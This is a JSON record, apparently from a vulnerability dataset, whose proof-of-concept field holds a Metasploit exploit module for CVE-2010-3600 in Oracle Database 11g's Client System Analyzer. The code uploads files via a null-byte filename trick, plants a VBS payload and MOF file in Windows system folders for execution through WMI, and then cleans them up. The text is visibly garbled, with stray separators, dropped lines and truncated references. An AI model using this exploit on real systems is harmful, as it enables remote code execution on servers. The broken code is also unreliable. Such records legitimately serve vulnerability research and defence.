{
    "text": "vul_name : Oracle Database Client System Analyzer Arbitrary File Upload ， vul_cve : CVE-2010-3600 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， HttpFingerprint = { : pattern => [ /Oracle Containers for J2EE/ ] } ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : WbemExec ， super ( update_info ( info ,  ， 'Name' => 'Oracle Database Client System Analyzer Arbitrary File Upload' ,  ， 'Description' => %q{ ， This module exploits an arbitrary file upload vulnerability on the Client ， Analyzer component as included in Oracle Database 11g , which allows remote ， attackers to upload and execute arbitrary code. This module has been tested ， successfully on Oracle Database 11g 11.2.0.1.0 on Windows 2003 SP2 , where execution ， through the Windows Management Instrumentation service has been used. ， } ,  ， 'Author' => ，  [  ， '1c239c43f521145fa8385d64a9c32243' ,  # Vulnerability discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， 'Platform' => [ 'win' ]  ,  ， 'Privileged' => true ,  ， ' ，  [  ，  [ 'CVE' , '2010-3600' ]  ,  ，  [ 'OSVDB' , '70546' ]  ,  ，  [ 'BID' , '45883' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Targets' => ，  [  ，  [ 'Oracle Oracle11g 11.2.0.1.0 / Windows 2003 SP2' , {} ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Jan 18 2011' ， register_options (  ，  [  ， Opt : RPORT ( 1158 )  ,  ， OptBool.new ( 'SSL' ,  [ true , 'Use SSL' , true ]  )  ,  ， OptInt.new ( 'DEPTH' ,  [ true , 'Traversal depth to reach the root' , 13 ]  )  ，  ]  , self.class )  ， end ， vbs_path = \"C : \\windows\\system32\\ # { @ var_vbs_name}.vbs\" ， mof_path = \"C : \\windows\\system32\\wbem\\mof\\good\\ # { @ var_mof_name}.mof\" ， print_error ( \"NOTE : you must use a meterpreter payload in order to automatically cleanup.\" )  ， print_error ( \"The vbs payload (  # {vbs_path} ) and mof file (  # {mof_path} ) must be removed manually.\" )  ， end ，  # stdapi must be loaded before we can use fs.file ， client.core.use ( \"stdapi\" ) if not client.ext.aliases.include? ( \"stdapi\" )  ， attrib_path = \"C : \\windows\\system32\\attrib.exe -r \" ， cmd = attrib_path + mof_path ， client.sys.process.execute ( cmd , nil , {'Hidden' => true } )  ， begin ， print_warning ( \"Deleting the vbs payload \\\" # { @ var_vbs_name}.vbs\\\" .\" )  ， client.fs.file.rm ( vbs_path )  ， print_warning ( \"Deleting the mof file \\\" # { @ var_mof_name}.mof\\\" .\" )  ， client.fs.file.rm ( mof_path )  ， rescue : Exception => e ， print_error ( \"Exception :  # {e.inspect}\" )  ， end ， end ， res = send_request_cgi (  ， { ， 'uri' => '/em/ecm/csa/v10103/CSAr.jsp' ,  ， 'method' => 'POST' ,  ， 'data' => data ， } )  ， end ， def check ， file_name = rand_text_alpha ( rand ( 5 ) +5 )  ， file_contents = rand_text_alpha ( rand ( 20 ) +20 )  ， data = \"sessionID= # {file_name}.txt\\x00.xml\" ， data \"\\x0d\\x0a\" ， data Rex : Text.uri_encode ( file_contents )  ， print_status ( \"Uploading the CSA # {file_name}.txt file\" )  ， res = upload_file ( data )  ， print_error ( \"The test file could not be uploaded\" ) ",
    "time": "2012.11.15"
}